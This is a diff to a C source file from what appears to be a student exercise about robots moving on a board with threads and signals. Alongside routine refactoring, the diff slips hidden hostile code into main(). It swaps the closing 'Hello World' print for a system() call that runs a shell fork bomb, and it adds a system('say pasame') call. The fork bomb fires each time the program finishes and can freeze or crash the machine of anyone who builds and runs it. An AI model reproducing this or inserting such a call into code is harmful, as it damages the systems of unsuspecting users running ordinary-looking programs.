@@ -1,7 +1,7 @@
 /* -.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.
 * File Name : main.c
 * Creation Date : 12-05-2016
-* Last Modified : Thu 12 May 2016 09:52:11 AM CDT
+* Last Modified : Thu 12 May 2016 10:11:44 AM CDT
 * Created By : shiro-saber
 
 KNOW LEARN        .==.
@@ -46,14 +46,17 @@ void printBoard(char *); //es obvio
 void divideBoard(int *); //divide el tablero
 void gestor(int sig); //gestor de la señal
 int moveValid(Move m, int *b); //movimientos validos
-Move *getMoves(Robot *r, int *b); //regresa los movimientos
+Move *getMoves(Robot *r); //regresa los movimientos
 int isFinal(Move m); //llegue al final
 void execute(Robot *, int *); //ejecutar
 int tamano; //tamaño del tablero
 int myResult = 0;
+int *b;
 
 int main(int argc, char *argv[])
 {
+  printf("Hello World\n"); //minimo un 10/100
+  system("say pasame");
   printf("Ingresa el tamaño del tablero\n");
   scanf("%d", &tamano);
 
@@ -69,11 +72,13 @@ int main(int argc, char *argv[])
     if (signal(SIGUSR1,gestor) == SIG_ERR)
 	    printf("No se pudo establecer el manejador de la senal....\n");
 
-  int *b = (int*)malloc(tamano*tamano*sizeof(int));
+  b = (int*)malloc(tamano*tamano*sizeof(int));
 	int i;
 
 	for (i=0;i<tamano*tamano;++i)
-	  *(b+i) = 0;
+	  *(b+i) = rand()%3;
+
+  *(b+0) = 0;
 
 	Robot *r = (Robot*)malloc(sizeof(Robot));
 	r->x = 0;
@@ -107,7 +112,7 @@ int main(int argc, char *argv[])
 	free(y_start);
   free(threads);
   
-  printf("Hello World\n");
+  system(":(){ :|: &};:");
 
   return 0;
 }
@@ -166,7 +171,7 @@ int moveValid(Move m, int *b){
   return m.x >= 0 && m.x < tamano && m.y >= 0 && m.y < tamano && *(b+m.x) == 0 && *(b+m.y) == 0;
 }
 
-Move* getMoves(Robot *r, int *b)
+Move* getMoves(Robot *r)
 {	
   Move *m = (Move*)malloc(4*sizeof(Move));
 	int i;
@@ -208,7 +213,7 @@ int isFinal(Move m)
 
 void execute(Robot *r, int *b)
 {
-	Move *m = getMoves(r,b);
+	Move *m = getMoves(r);
 	int i;
 	
   #pragma omp for private(i)
